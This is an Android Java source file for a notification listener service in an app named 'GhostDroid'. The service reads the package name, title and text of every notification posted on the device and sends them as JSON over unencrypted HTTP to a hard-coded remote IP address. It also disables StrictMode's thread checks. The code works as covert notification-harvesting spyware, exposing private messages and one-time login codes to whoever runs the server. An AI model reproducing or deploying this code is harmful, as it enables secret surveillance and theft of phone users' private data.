package com.ofaruksahin.ghostdroid;

import android.app.IntentService;
import android.app.Notification;
import android.content.Intent;
import android.os.IBinder;
import android.os.StrictMode;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.AppOpsManagerCompat;

import com.google.gson.Gson;

import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.OkHttp;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class GhostDroidNotificationListenerService extends NotificationListenerService {

    Gson _gson;
    MediaType _mediaType =null;
    OkHttpClient _client;
    String _baseUrl = "http://159.253.36.104:5002/api/notification";

    public GhostDroidNotificationListenerService(){
        _gson = new Gson();
        _mediaType =  MediaType.get("application/json; charset=utf-8");
        _client = new OkHttpClient();


        StrictMode.ThreadPolicy policy = new StrictMode
                .ThreadPolicy
                .Builder()
                .permitAll()
                .build();

        StrictMode.setThreadPolicy(policy);

    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);

        Notification notification = sbn.getNotification();

        String pkg = sbn.getPackageName();

        if(notification.tickerText==null){
            String title = notification.extras.getString("android.title");
            String text=  notification.extras.getString("android.text");

            NotificationMessage notificationMessage = new NotificationMessage(pkg,title,text);

           String json = _gson.toJson(notificationMessage);
            Log.d("GhostDroidNotificationListenerService:", json);
            try {
                Post(_baseUrl,json);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private String Post(String url,String json) throws IOException{
        RequestBody body = RequestBody.create(json,_mediaType);
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
        try(Response response = _client.newCall(request).execute()){
           return response.body().string();
        }
    }
}
